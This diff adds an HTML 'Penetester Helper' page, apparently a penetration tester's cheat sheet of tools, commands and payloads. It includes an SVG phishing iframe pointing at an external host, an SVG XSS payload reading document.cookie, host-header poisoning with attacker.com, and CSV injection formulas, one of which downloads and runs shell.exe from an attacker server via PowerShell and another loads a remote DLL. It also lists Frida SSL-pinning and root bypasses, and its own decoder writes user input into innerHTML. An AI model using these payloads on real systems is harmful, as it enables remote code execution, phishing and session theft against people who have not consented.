@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Penetester Helper</title>
+	<link rel="stylesheet" href="style.css">
+	<?--boostrap---?>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+  </head>
+  <body>
+  
+	<div><h1 class="penetesterHelper">Penetester Helper</h1></div>
+	<div class="tools"><h2>Tools</h2></div>
+	<ul class="list-group tools">
+		<li class="list-group-item">1. Postman API count <a href="https://raw.githubusercontent.com/penetesterhelper/penetesterhelper.github.io/main/apiCount.py">Download</a></li>
+		<li class="list-group-item">2. Base64EncodeDecode</li>
+			<ul class="list-group tools">
+				<li class="list-group-item">2.1 List <a href="https://raw.githubusercontent.com/penetesterhelper/penetesterhelper.github.io/main/base64decoder.py">Download</a></li>
+				<li class="list-group-item">2.2 Sample text</li></br>
+					<div class="input-group mb-3">
+						<span class="input-group-text" id="basic-addon1">Decode Base64</span>
+						<input type="text" class="form-control" oninput="decode()"  id="myInput" placeholder="Encode String" aria-describedby="basic-addon1">
+					</div>
+					<code class="txtCenter" id="decodeValue">Decode String Here</code>
+					</br>
+					<div class="input-group mb-3">
+						<span class="input-group-text" id="basic-addon1">Encode Base64</span>
+						<input type="text" class="form-control" id="myInputEncode" oninput="encode()"  placeholder="Decode String" aria-describedby="basic-addon1">
+					</div>
+					<code class="txtCenter" id="encodeValue">Encode String Here</code>
+			</ul></br>
+		<li class="list-group-item">3. CSRF JSON payload <a href="">Download</a></li>
+	</ul>
+	
+	<div class="tools"><h2>Vulnerability Notes & Payloads</h2></div>
+	
+	<div class="tools"><h3>CIA</h3></div>
+	<code class="tools">
+		Integrity : data only change by auth.</br>
+		Avalability : Available data when user need.</br>
+		Confidentility : Data access by auth.
+	</code> 
+
+	<div class="tools"><h3>Containt Discover</h3></div>
+	<code class="tools">
+		dirb https://domain.com/ /usr/share/wordlists/dirb/big.txt </br>
+		gobuster -u http://fakebank.com -w wordlist.txt dir 
+	</code> 
+	
+	<div class="tools"><h3>Directory Traversal</h3></div>
+	<code class="tools">
+		dirb https://domain.com/ /usr/share/wordlists/wfuzz/vulns/dirTraversal-nix.txt
+	</code> 
+	
+	<div class="tools"><h3>Clickjacking</h3></div>
+	<code class="tools">
+		dirb https://domain.com/ /usr/share/wordlists/wfuzz/vulns/dirTraversal-nix.txt
+	</code> 
+	
+	<div class="tools"><h3>Weak SSL Ciphers</h3></div>
+	<p class="tools">V1.0 & V1.1 is vulnerable</p>
+	<code class="tools">
+		nmap -Pn --script ssl-enum-ciphers {domain} -p {port}
+	</code> 
+	
+	<div class="tools"><h3>Host Header Poisoning</h3></div>
+	<p class="tools">1. Basic</p>
+	<code class="tools">
+		Change "Host" header and check response is 200 OK or not if response is 200 Ok then find 302 response 
+	</code> 
+	
+	<p class="tools">2. via middleware (for password reseting)</p>
+	<code class="tools">
+		Add X-Forwarded-Host: domain.com
+	</code> 
+	
+	<p class="tools">3. via dangling markup</p>
+	<code class="tools">
+		Try "Host: domain.com" to "Host: domain.com:attacker.com"
+	</code> 
+	
+	<div class="tools"><h3>SVG Payload</h3></div>
+	<p class="tools">1. Phising Attack</p>
+	<code class="tools">
+&lt;svg width="1500" height="1500"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
+
+  &lt;foreignObject width="1500px" height="1500px"&gt;
+	&lt;iframe xmlns="http://www.w3.org/1999/xhtml" style="width: 1500px; height: 1500px;" src="https://numberless-holddown.000webhostapp.com/"/&gt;
+  &lt;/foreignObject&gt;
+&lt;/svg&gt;
+	</code> 
+	
+	<p class="tools">2. XSS</p>
+	<code class="tools">
+&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
+
+&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
+   &lt;rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /&gt;
+   &lt;script type="text/javascript"&gt;
+	  alert(document.cookie);
+   &lt;/script&gt;
+&lt;/svg&gt;
+	</code> 
+	
+	<div class="tools"><h3>CSV Injection Payload</h3></div>
+	<code class="tools">
+DDE ("cmd";"/C calc";"!A0")A0</br>
+@SUM(1+9)*cmd|' /C calc'!A0</br>
+=10+20+cmd|' /C calc'!A0</br>
+=cmd|' /C notepad'!'A1'</br>
+=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0</br>
+=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1</br>
+=@MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!_xlbgnm.A1
+	</code> 
+	
+		<div class="tools"><h3>CORS</h3></div>
+	<code class="tools">
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md</a>
+	</code> 
+	
+	<div class="tools"><h3>App Manipulation</h3></div>
+	<p class="tools">1. Decompiling apk</p>
+	<code class="tools">
+apktool d apk_name
+	</code> 
+	
+
+	<p class="tools">2. Compiling apk</p>
+	<code class="tools">
+apktool b apk_name  </br>
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000   </br>
+java -jar .\apksigner.jar  sign --ks my-release-key.keystore app-debug.apk
+	</code> 
+	
+	<div class="tools"><h3>Sensitive Information in Application Memory (Memory Dump)</h3></div>
+	<code class="tools">
+frida-ps -U </br>
+python3 fridump.py -U -s "UPCL Smart Billing" </br>
+	</code> 
+	<p class="tools">Reference: <a href="http://pentestcorner.com/fridump-android-examples/">http://pentestcorner.com/fridump-android-examples/</a></p>
+	<div class="tools"><h3>Frida</h3></div>
+	<p class="tools">1. Tools</p>
+	<code class="tools">
+1) Android Emulator API 32 </br>
+2) BurpSuit 
+	</code> 
+	
+	<p class="tools">2. Install Frida in Android Emulator</p>
+	<code class="tools">
+adb push frida_server /data/local/tmp  </br>
+adb push ca_cert /data/local/tmp
+	</code> 
+	
+	<p class="tools">3. Install Frida in Windows or Linux</p>
+	<code class="tools">
+pip3 install frida-tools </br>
+pip3 install objection frida-tools
+	</code> 
+	
+	<p class="tools">4. Package Name</p>
+	<code class="tools">
+frida-ps -Ua
+	</code> 
+	
+	<p class="tools">SSL Bypass</p>
+	<code class="tools">
+objection -g pakage_name explore  </br>
+android sslpinning disable  
+	</code> 
+	
+	<p class="tools">Root Bypass</p>
+	<code class="tools">
+frida -U --codeshare dzonerzy/fridantiroot -f YOUR_BINARY
+
+	</code> 
+	
+	<div class="tools"><h2>ADB Command</h2></div>
+	<div class="tools"><h3>ADB Root</h3></div>
+	<code class="tools">
+		adb root
+	</code> 
+	
+	<div class="tools"><h3>Download application or file from enumalator</h3></div>
+	<code class="tools">
+		adb pull /data/app/{package-name} /{location}
+	</code> 
+	
+	<div class="tools"><h3>Install Application or transfer file</h3></div>
+	<code class="tools">
+			adb push {file.path} {location}
+	</code> 
+	
+	<div class="tools"><h3>Activity Manager</h3></div>
+	<code class="tools">
+		adb shell am start -n {package_name}/.{activity_name}
+	</code> 
+	
+	<div class="tools"><h2>Bug Bounty Report Mail</h2></div>
+	
+	<div class="tools"><h3>Sent Report First Time</h3></div>
+	<code class="tools">
+Subject: Security Vulnerabilities Found on Website </br>
+
+Dear [name], </br>
+
+I recently visited your website and noticed a bug while I was navigating through the pages. I am writing to notify you that I have identified several 		security vulnerabilities on your website. Specifically, I discovered an [Vulnerability_Name] These are serious issues which could potentially lead to a data breach or other malicious activities if left unaddressed. As such it is important that these issues be addressed as soon as possible in order to protect your website from potential threats. Please let me know how you would like me to proceed with providing additional information about these findings so we can work together towards resolving them quickly and efficiently for the safety of your customers’ data and other sensitive information stored within the system.  </br>
+
+POC: [POC] </br>
+
+Sincerely </br>
+[Your Name]	</code> 
+	<script>
+function decode() {
+  let text = document.getElementById("myInput").value;
+  document.getElementById("decodeValue").innerHTML = atob(text);
+}
+function encode() {
+  let text = document.getElementById("myInputEncode").value;
+  document.getElementById("encodeValue").innerHTML = btoa(text);
+}
+</script>
+	
+	<?--boostrap---?>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
+  </body>
+</html>
+
+
